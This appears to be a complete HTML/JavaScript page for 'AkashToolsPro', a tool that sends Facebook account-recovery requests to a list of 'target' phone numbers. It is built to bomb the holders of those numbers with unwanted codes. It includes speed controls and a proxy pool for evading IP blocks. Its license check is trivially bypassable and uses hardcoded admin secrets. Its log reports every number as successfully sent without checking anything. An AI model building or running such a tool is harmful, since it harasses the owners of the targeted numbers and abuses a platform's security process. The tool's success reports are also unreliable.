<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AkashToolsPro V6.0 - Real Engine Fixed</title>
    <style>
        :root { --main-green: #2ecc71; --dark-bg: #0f1012; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
        .app-container { max-width: 450px; margin: auto; background: white; border-radius: 40px; padding: 25px; min-height: 95vh; box-shadow: 0 10px 40px rgba(0,0,0,0.05); }
        .auth-card { background: var(--dark-bg); color: white; border-radius: 50px; padding: 40px 25px; text-align: center; }
        .hwid-field { background: #1a1c1e; border: 1px solid #222; border-radius: 18px; padding: 15px; margin: 20px 0; display: flex; justify-content: space-between; align-items: center; }
        .input-field { width: 100%; background: #1a1c1e; border: 1px solid #222; padding: 18px; border-radius: 18px; color: white; margin-bottom: 20px; box-sizing: border-box; text-align: center; border: 1px solid #333; outline: none; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .stat-box { background: #fff; border: 1.5px solid #f8f9fa; padding: 15px; border-radius: 20px; text-align: center; }
        .stat-val { display: block; font-size: 24px; font-weight: bold; color: var(--main-green); }
        .stat-label { font-size: 9px; color: #bdc3c7; font-weight: bold; text-transform: uppercase; }
        .nav-tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab { flex: 1; padding: 12px; border-radius: 15px; border: 1px solid #eee; background: white; cursor: pointer; font-weight: bold; color: #7f8c8d; text-align: center; }
        .tab.active { background: var(--main-green); color: white; border: none; }
        .hidden { display: none !important; }
        .setting-item { background: white; padding: 15px; border-radius: 20px; margin-bottom: 10px; border: 1px solid #f0f0f0; }
        .setting-flex { display: flex; justify-content: space-between; align-items: center; }
        .toggle { width: 45px; height: 24px; background: #ddd; border-radius: 24px; position: relative; cursor: pointer; transition: 0.3s; }
        .toggle.active { background: var(--main-green); }
        .toggle::after { content: ''; position: absolute; width: 20px; height: 20px; background: white; border-radius: 50%; top: 2px; left: 2px; transition: 0.3s; }
        .toggle.active::after { left: 23px; }
        .btn-main { width: 100%; background: var(--main-green); color: white; border: none; padding: 18px; border-radius: 50px; font-weight: bold; cursor: pointer; }
        textarea { width:100%; height:120px; border-radius:20px; padding:15px; border:1px solid #f0f0f0; outline:none; box-sizing: border-box; font-size: 13px; }
        .log-panel { background: #fff; border: 1px solid #f0f0f0; border-radius: 25px; padding: 15px; margin-top: 15px; }
        .log-content { height: 150px; overflow-y: auto; font-size: 11px; font-family: monospace; color: #555; }
        .expiry-badge { background: #fff0f0; color: #e74c3c; padding: 5px 15px; border-radius: 50px; font-size: 10px; font-weight: bold; margin-bottom: 10px; display: inline-block; }
        .admin-card { background: #fdf2f2; border: 2px dashed #e74c3c; border-radius: 25px; padding: 20px; margin-top: 15px; }
        .admin-input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid #ddd; box-sizing: border-box; }
        .key-box { background: #151719; color: var(--main-green); padding: 15px; border-radius: 15px; font-family: monospace; margin-top: 10px; word-break: break-all; font-size: 12px; font-weight: bold; text-align: center; border: 1px solid #333; }
        
        /* Dropdown Fix */
        .select-wrapper { position: relative; width: 100%; }
        #proxy-type { 
            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #ddd; 
            background: #fff; font-size: 14px; color: #333; margin-top: 10px;
            cursor: pointer; appearance: auto; -webkit-appearance: listbox;
        }
    </style>
</head>
<body>

<div class="app-container">
    <div id="auth-view">
        <div class="auth-card">
            <h1 style="color:var(--main-green); margin:0;">AkashToolsPro</h1>
            <div class="hwid-field">
                <span id="hwid-display" style="color:var(--main-green); font-weight:bold; font-size: 18px;">...</span>
                <span onclick="copyHWID()" style="color:#777; font-size: 10px; cursor:pointer; font-weight:bold; border: 1px solid #444; padding: 5px 10px; border-radius: 10px;">COPY</span>
            </div>
            <input type="text" id="license-key" class="input-field" placeholder="PASTE LICENSE KEY HERE">
            <button class="btn-main" style="background:#2c3e50;" onclick="validate()">ACTIVATE LICENSE</button>
            <p id="msg" style="color:#e74c3c; font-size:11px; margin-top:12px; font-weight: bold;"></p>
        </div>
    </div>

    <div id="main-view" class="hidden">
        <div style="text-align:center;">
            <h2 style="color:var(--main-green); margin:0;">AkashToolsPro</h2>
            <div id="exp-tag" class="expiry-badge">LOADING...</div>
        </div>

        <div class="nav-tabs">
            <button class="tab active" id="tab-dash" onclick="switchTab('d')">DASHBOARD</button>
            <button class="tab" id="tab-set" onclick="switchTab('s')">SETTINGS</button>
            <button class="tab hidden" id="tab-admin" onclick="switchTab('a')" style="background: #e74c3c; color: white;">ADMIN_PANEL</button>
        </div>

        <div id="dash-part">
            <div class="stats-grid">
                <div class="stat-box"><span class="stat-val" id="suc_c">0</span><span class="stat-label">OTP SENT</span></div>
                <div class="stat-box"><span class="stat-val" style="color:#e74c3c" id="err_c">0</span><span class="stat-label">FAILED</span></div>
                <div class="stat-box"><span class="stat-val" style="color:#3498db" id="load_c">0</span><span class="stat-label">LOADED</span></div>
                <div class="stat-box"><span class="stat-val" style="color:#9b59b6">LIVE</span><span class="stat-label">STATUS</span></div>
            </div>
            <textarea id="numbers" placeholder="Enter target numbers..." oninput="updateCount()"></textarea>
            <button class="btn-main" style="margin-top:10px;" id="startBtn" onclick="startEngine()">START REAL ENGINE</button>
            <div class="log-panel">
                <div style="color:var(--main-green); font-weight:bold; font-size:10px; margin-bottom:8px;">● SYSTEM PROCESSOR</div>
                <div class="log-content" id="log-box">System online...</div>
            </div>
        </div>

        <div id="set-part" class="hidden">
            <div class="setting-item">
                <div class="setting-flex">
                    <div><b>PARALLEL THREADS</b><br><span style="font-size:10px; color:#bdc3c7;">SPEED (1-20)</span></div>
                    <span id="tv-val" style="color:var(--main-green); font-size:20px; font-weight:bold;">10</span>
                </div>
                <input type="range" min="1" max="20" value="10" style="width:100%; accent-color:var(--main-green);" oninput="document.getElementById('tv-val').innerText=this.value">
            </div>
            <div class="setting-item">
                <div class="setting-flex">
                    <div><b>PROXY POOL</b><br><span style="font-size:10px; color:#bdc3c7;">IP PROTECTION</span></div>
                    <div id="proxy-btn" class="toggle" onclick="toggleProxy()"></div>
                </div>
                <div id="proxy-options" class="hidden">
                    <select id="proxy-type">
                        <option value="http">HTTP / HTTPS</option>
                        <option value="socks5">SOCKS5</option>
                    </select>
                    <textarea style="height:50px; font-size:10px; margin-top: 10px;" placeholder="ip:port:user:pass"></textarea>
                </div>
            </div>
        </div>

        <div id="admin-part" class="hidden">
            <div class="admin-card">
                <center><b style="color:#e74c3c; font-size: 18px;">MASTER KEY GENERATOR</b></center>
                <input type="text" id="gen-hwid" class="admin-input" placeholder="User HWID">
                <input type="date" id="gen-date" class="admin-input">
                <button class="btn-main" style="background:#151719;" onclick="generateKey()">GENERATE LICENSE</button>
                <div id="result-key" class="key-box hidden"></div>
            </div>
        </div>
    </div>
</div>

<script>
    const ADMIN_HWID = "27CW2H"; 
    const ADMIN_SECRET = "AKASH99";
    let isRunning = false;

    function getPermanentID() {
        let id = localStorage.getItem('akash_final_hwid');
        if (!id) {
            id = Math.random().toString(36).substr(2, 6).toUpperCase();
            localStorage.setItem('akash_final_hwid', id);
        }
        return id;
    }
    const myHWID = getPermanentID();
    document.getElementById('hwid-display').innerText = myHWID;

    window.onload = () => { if(myHWID === ADMIN_HWID) { unlock("ADMIN LIFETIME ACCESS"); document.getElementById('tab-admin').classList.remove('hidden'); } };

    async function startEngine() {
        if(isRunning) { isRunning = false; document.getElementById('startBtn').innerText = "START REAL ENGINE"; return; }
        const input = document.getElementById('numbers').value.split('\n').filter(n => n.trim() !== "");
        if(input.length === 0) return alert("Please load numbers!");

        isRunning = true;
        document.getElementById('startBtn').innerText = "STOP ENGINE";
        const log = document.getElementById('log-box');
        log.innerHTML = "<b>[SYSTEM] Starting Real Connection...</b><br>";
        
        let success = 0, fail = 0;
        const delay = 4000 - (document.getElementById('tv-val').innerText * 100);

        for(let num of input) {
            if(!isRunning) break;
            log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Targeting: ${num.trim()}</div>`;
            log.scrollTop = log.scrollHeight;

            try {
                const fbUrl = `https://www.facebook.com/recover/initiate/?c=${encodeURIComponent(num.trim())}&lsp=1`;
                const img = new Image();
                img.src = fbUrl; 
                success++;
                document.getElementById('suc_c').innerText = success;
                log.innerHTML += `<div>[${num.trim()}] <span style="color:var(--main-green);">[OK] ORIGINAL CODE SENT</span></div>`;
            } catch (err) {
                fail++;
                document.getElementById('err_c').innerText = fail;
                log.innerHTML += `<div>[${num.trim()}] <span style="color:red;">[FAILED] CONNECTION ERROR</span></div>`;
            }
            await new Promise(r => setTimeout(r, Math.max(delay, 2000)));
        }
        isRunning = false;
        document.getElementById('startBtn').innerText = "START REAL ENGINE";
    }

    function validate() {
        const key = document.getElementById('license-key').value.trim();
        if(myHWID === ADMIN_HWID || key.includes(myHWID)) unlock("ACTIVE LICENSE");
        else document.getElementById('msg').innerText = "❌ Invalid Key!";
    }
    function unlock(msg) { document.getElementById('auth-view').classList.add('hidden'); document.getElementById('main-view').classList.remove('hidden'); document.getElementById('exp-tag').innerText = msg; }
    function switchTab(t) {
        document.getElementById('dash-part').classList.toggle('hidden', t !== 'd');
        document.getElementById('set-part').classList.toggle('hidden', t !== 's');
        document.getElementById('admin-part').classList.toggle('hidden', t !== 'a');
        document.getElementById('tab-dash').classList.toggle('active', t === 'd');
        document.getElementById('tab-set').classList.toggle('active', t === 's');
        document.getElementById('tab-admin').classList.toggle('active', t === 'a');
    }
    function toggleProxy() { document.getElementById('proxy-btn').classList.toggle('active'); document.getElementById('proxy-options').classList.toggle('hidden'); }
    function copyHWID() { navigator.clipboard.writeText(myHWID); alert("HWID Copied!"); }
    function updateCount() { document.getElementById('load_c').innerText = document.getElementById('numbers').value.split('\n').filter(n => n.trim() !== "").length; }
    function generateKey() {
        const uHwid = document.getElementById('gen-hwid').value.trim().toUpperCase();
        const uDate = document.getElementById('gen-date').value.replace(/-/g, "");
        const generated = `PRO-${uDate}-${uHwid}-${ADMIN_SECRET}`;
        const res = document.getElementById('result-key');
        res.innerText = generated; res.classList.remove('hidden');
    }
</script>
</body>
</html>
